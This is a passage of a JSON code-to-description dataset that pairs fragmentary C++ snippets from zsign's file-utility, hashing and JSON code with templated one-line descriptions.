    "code_type": "function"
  },
  {
    "id": "488",
    "code": "struct stat info;\nstat(file, &info);\nreturn S_ISREG(info.st_mode);\n}\n\nvoid *MapFile(const char *path, size_t offset, size_t size, size_t *psize, bool ro)\n{",
    "nl": "struct stat - implements stat functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "struct"
  },
  {
    "id": "489",
    "code": "return S_ISREG(info.st_mode);",
    "nl": "Function S_ISREG - implements s isreg functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "490",
    "code": "struct stat stat;\nfstat(fd, &stat);\nsize = stat.st_size;\n}\n\nif (NULL != psize)\n{",
    "nl": "struct stat - implements stat functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "struct"
  },
  {
    "id": "491",
    "code": "bool WriteFile(const char *szFile, const char *szData, size_t sLen)\n{",
    "nl": "Function WriteFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "492",
    "code": "bool WriteFile(const char *szFile, const string &strData) { return WriteFile(szFile, strData.data(), strData.size()); }",
    "nl": "Function WriteFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "493",
    "code": "bool WriteFile(string &strData, const char *szFormatPath, ...)\n{",
    "nl": "Function WriteFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "494",
    "code": "return WriteFile(szPath, strData);",
    "nl": "Function WriteFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "495",
    "code": "bool WriteFile(const char *szData, size_t sLen, const char *szFormatPath, ...)\n{",
    "nl": "Function WriteFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "496",
    "code": "return WriteFile(szPath, szData, sLen);",
    "nl": "Function WriteFile - implements writefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "497",
    "code": "bool ReadFile(const char *szFile, string &strData)\n{",
    "nl": "Function ReadFile - implements readfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "498",
    "code": "bool ReadFile(string &strData, const char *szFormatPath, ...)\n{",
    "nl": "Function ReadFile - implements readfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "499",
    "code": "return ReadFile(szPath, strData);",
    "nl": "Function ReadFile - implements readfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "500",
    "code": "bool AppendFile(const char *szFile, const char *szData, size_t sLen)\n{",
    "nl": "Function AppendFile - implements appendfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "501",
    "code": "bool AppendFile(const char *szFile, const string &strData)\n{",
    "nl": "Function AppendFile - implements appendfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "502",
    "code": "return AppendFile(szFile, strData.data(), strData.size());",
    "nl": "Function AppendFile - implements appendfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "503",
    "code": "bool IsFolder(const char *szFolder)\n{",
    "nl": "Function IsFolder - implements isfolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "504",
    "code": "struct stat st;\nstat(szFolder, &st);\nreturn S_ISDIR(st.st_mode);\n}\n\nbool IsFolderV(const char *szFormatPath, ...)\n{",
    "nl": "struct stat - implements stat functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "struct"
  },
  {
    "id": "505",
    "code": "return S_ISDIR(st.st_mode);",
    "nl": "Function S_ISDIR - implements s isdir functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "506",
    "code": "bool IsFolderV(const char *szFormatPath, ...)\n{",
    "nl": "Function IsFolderV - implements isfolderv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "507",
    "code": "return IsFolder(szFolder);",
    "nl": "Function IsFolder - implements isfolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "508",
    "code": "bool CreateFolder(const char *szFolder)\n{",
    "nl": "Function CreateFolder - implements createfolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "509",
    "code": "bool CreateFolderV(const char *szFormatPath, ...)\n{",
    "nl": "Function CreateFolderV - implements createfolderv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "510",
    "code": "return CreateFolder(szFolder);",
    "nl": "Function CreateFolder - implements createfolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "511",
    "code": "int RemoveFolderCallBack(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf)\n{",
    "nl": "struct stat - implements stat functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "struct"
  },
  {
    "id": "512",
    "code": "bool RemoveFolder(const char *szFolder)\n{",
    "nl": "Function RemoveFolder - implements removefolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "513",
    "code": "return nftw(szFolder, RemoveFolderCallBack, 64, FTW_DEPTH | FTW_PHYS);",
    "nl": "Function nftw - implements nftw functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "514",
    "code": "bool RemoveFolderV(const char *szFormatPath, ...)\n{",
    "nl": "Function RemoveFolderV - implements removefolderv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "515",
    "code": "return RemoveFolder(szFolder);",
    "nl": "Function RemoveFolder - implements removefolder functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "516",
    "code": "bool RemoveFile(const char *szFile) { return (0 == remove(szFile)); }",
    "nl": "Function RemoveFile - implements removefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "517",
    "code": "bool RemoveFileV(const char *szFormatPath, ...)\n{",
    "nl": "Function RemoveFileV - implements removefilev functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "518",
    "code": "return RemoveFile(szFile);",
    "nl": "Function RemoveFile - implements removefile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "519",
    "code": "bool IsFileExists(const char *szFile)\n{",
    "nl": "Function IsFileExists - implements isfileexists functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "520",
    "code": "bool IsFileExistsV(const char *szFormatPath, ...)\n{",
    "nl": "Function IsFileExistsV - implements isfileexistsv functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "521",
    "code": "return IsFileExists(szFile);",
    "nl": "Function IsFileExists - implements isfileexists functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "522",
    "code": "bool IsZipFile(const char *szFile)\n{",
    "nl": "Function IsZipFile - implements iszipfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "523",
    "code": "string GetCanonicalizePath(const char *szPath)\n{",
    "nl": "Function GetCanonicalizePath - implements getcanonicalizepath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "524",
    "code": "int64_t GetFileSize(int fd)\n{",
    "nl": "Function GetFileSize - implements getfilesize functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "525",
    "code": "struct stat stbuf;\nif (0 == fstat(fd, &stbuf))\n{",
    "nl": "struct stat - implements stat functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "struct"
  },
  {
    "id": "526",
    "code": "int64_t GetFileSize(const char *szFile)\n{",
    "nl": "Function GetFileSize - implements getfilesize functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "527",
    "code": "int64_t GetFileSizeV(const char *szFormatPath, ...)\n{",
    "nl": "Function GetFileSizeV - implements getfilesizev functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "528",
    "code": "return GetFileSize(szFile);",
    "nl": "Function GetFileSize - implements getfilesize functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "529",
    "code": "string GetFileSizeString(const char *szFile) { return FormatSize(GetFileSize(szFile), 1024); }",
    "nl": "Function GetFileSizeString - implements getfilesizestring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "530",
    "code": "string FormatSize(int64_t size, int64_t base)\n{",
    "nl": "Function FormatSize - implements formatsize functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "531",
    "code": "bool IsPathSuffix(const string &strPath, const char *suffix)\n{",
    "nl": "Function IsPathSuffix - implements ispathsuffix functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "532",
    "code": "time_t GetUnixStamp()\n{",
    "nl": "Function GetUnixStamp - implements getunixstamp functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "533",
    "code": "uint64_t GetMicroSecond()\n{",
    "nl": "Function GetMicroSecond - implements getmicrosecond functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "534",
    "code": "struct timeval tv = {0};\ngettimeofday(&tv, NULL);\nreturn tv.tv_sec * 1000000 + tv.tv_usec;\n}\n\nbool SystemExec(const char *szFormatCmd, ...)\n{",
    "nl": "struct timeval - implements timeval functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "struct"
  },
  {
    "id": "535",
    "code": "bool SystemExec(const char *szFormatCmd, ...)\n{",
    "nl": "Function SystemExec - implements systemexec functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "536",
    "code": "uint16_t _Swap(uint16_t value) { return ((value >> 8) & 0x00ff) | ((value << 8) & 0xff00); }",
    "nl": "Function _Swap - implements  swap functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "537",
    "code": "uint32_t _Swap(uint32_t value)\n{",
    "nl": "Function _Swap - implements  swap functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "538",
    "code": "uint64_t _Swap(uint64_t value)\n{",
    "nl": "Function _Swap - implements  swap functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "539",
    "code": "uint32_t ByteAlign(uint32_t uValue, uint32_t uAlign) { return (uValue + (uAlign - uValue % uAlign)); }",
    "nl": "Function ByteAlign - implements bytealign functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "540",
    "code": "void StringSplit(const string &src, const string &split, vector<string> &dest)\n{",
    "nl": "Function StringSplit - implements stringsplit functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "541",
    "code": "bool SHA1Text(const string &strData, string &strOutput)\n{",
    "nl": "Function SHA1Text - implements sha1text functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "542",
    "code": "void PrintSHASum(const char *prefix, const uint8_t *hash, uint32_t size, const char *suffix)\n{",
    "nl": "Function PrintSHASum - implements printshasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "543",
    "code": "void PrintSHASum(const char *prefix, const string &strSHASum, const char *suffix)\n{",
    "nl": "Function PrintSHASum - implements printshasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "544",
    "code": "void PrintDataSHASum(const char *prefix, int nSumType, const string &strData, const char *suffix)\n{",
    "nl": "Function PrintDataSHASum - implements printdatashasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "545",
    "code": "void PrintDataSHASum(const char *prefix, int nSumType, uint8_t *data, size_t size, const char *suffix)\n{",
    "nl": "Function PrintDataSHASum - implements printdatashasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "546",
    "code": "bool SHASum(int nSumType, uint8_t *data, size_t size, string &strOutput)\n{",
    "nl": "Function SHASum - implements shasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "547",
    "code": "bool SHASum(int nSumType, const string &strData, string &strOutput)\n{",
    "nl": "Function SHASum - implements shasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "548",
    "code": "return SHASum(nSumType, (uint8_t *)strData.data(), strData.size(), strOutput);",
    "nl": "Function SHASum - implements shasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "549",
    "code": "bool SHASum(const string &strData, string &strSHA1, string &strSHA256)\n{",
    "nl": "Function SHASum - implements shasum functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "550",
    "code": "bool SHASumFile(const char *szFile, string &strSHA1, string &strSHA256)\n{",
    "nl": "Function SHASumFile - implements shasumfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "551",
    "code": "bool SHASumBase64(const string &strData, string &strSHA1Base64, string &strSHA256Base64)\n{",
    "nl": "Function SHASumBase64 - implements shasumbase64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "552",
    "code": "bool SHASumBase64File(const char *szFile, string &strSHA1Base64, string &strSHA256Base64)\n{",
    "nl": "Function SHASumBase64File - implements shasumbase64file functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "553",
    "code": "return Reset();",
    "nl": "Function Reset - implements reset functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "554",
    "code": "return Reset();",
    "nl": "Function Reset - implements reset functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "555",
    "code": "std::ofstream logFile(logFilePath, std::ios_base::app);",
    "nl": "Function logFile - implements logfile functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/common.cpp",
    "code_type": "function"
  },
  {
    "id": "556",
    "code": "#define _atoi64(val) strtoll(val, NULL, 10)\n#endif\n\nconst JValue JValue::null;",
    "nl": "Function _atoi64 - implements  atoi64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "557",
    "code": "m_Value.vData = new string();",
    "nl": "Function string - implements string functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "558",
    "code": "JValue::operator const char *() const { return asCString(); }",
    "nl": "Function asCString - implements ascstring functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "559",
    "code": "JValue::operator int() const { return asInt(); }",
    "nl": "Function int - implements int functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "560",
    "code": "JValue::operator int64_t() const { return asInt64(); }",
    "nl": "Function int64_t - implements int64 t functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "561",
    "code": "JValue::operator double() const { return asFloat(); }",
    "nl": "Function double - implements double functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "562",
    "code": "JValue::operator string() const { return asCString(); }",
    "nl": "Function string - implements string functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "563",
    "code": "JValue::operator bool() const { return asBool(); }",
    "nl": "Function bool - implements bool functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "564",
    "code": "m_Value.vData = new string();",
    "nl": "Function string - implements string functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "565",
    "code": "return int(m_Value.vFloat);",
    "nl": "Function int - implements int functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "566",
    "code": "return _atoi64(asCString());",
    "nl": "Function _atoi64 - implements  atoi64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "567",
    "code": "return double(m_Value.vInt64);",
    "nl": "Function double - implements double functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "568",
    "code": "return atof(asCString());",
    "nl": "Function atof - implements atof functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "569",
    "code": "return remove((size_t)index);",
    "nl": "Function remove - implements remove functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "570",
    "code": "return write(strDoc);",
    "nl": "Function write - implements write functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "571",
    "code": "bool JValue::read(const string &strdoc, string *pstrerr) { return read(strdoc.c_str(), pstrerr); }",
    "nl": "Function read - implements read functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "572",
    "code": "bool JValue::push_back(int val) { return push_back(JValue(val)); }",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "573",
    "code": "bool JValue::push_back(bool val) { return push_back(JValue(val)); }",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "574",
    "code": "bool JValue::push_back(double val) { return push_back(JValue(val)); }",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "575",
    "code": "bool JValue::push_back(int64_t val) { return push_back(JValue(val)); }",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "576",
    "code": "bool JValue::push_back(const char *val) { return push_back(JValue(val)); }",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "577",
    "code": "bool JValue::push_back(const string &val) { return push_back(JValue(val)); }",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "578",
    "code": "bool JValue::push_back(const char *val, size_t len) { return push_back(JValue(val, len)); }",
    "nl": "Function push_back - implements push back functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "579",
    "code": "return styleWrite(strDoc);",
    "nl": "Function styleWrite - implements stylewrite functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "580",
    "code": "m_Value.vData = new string();",
    "nl": "Function string - implements string functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "581",
    "code": "return mktime(&ft);",
    "nl": "Function mktime - implements mktime functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/json.cpp",
    "code_type": "function"
  },
  {
    "id": "582",
    "code": "return readPList(strdoc.data(), strdoc.size(), pstrerr);",
    "nl": "Function readPList - implements readplist functionality",
    "language": "cpp",
    "folder": "Shared",
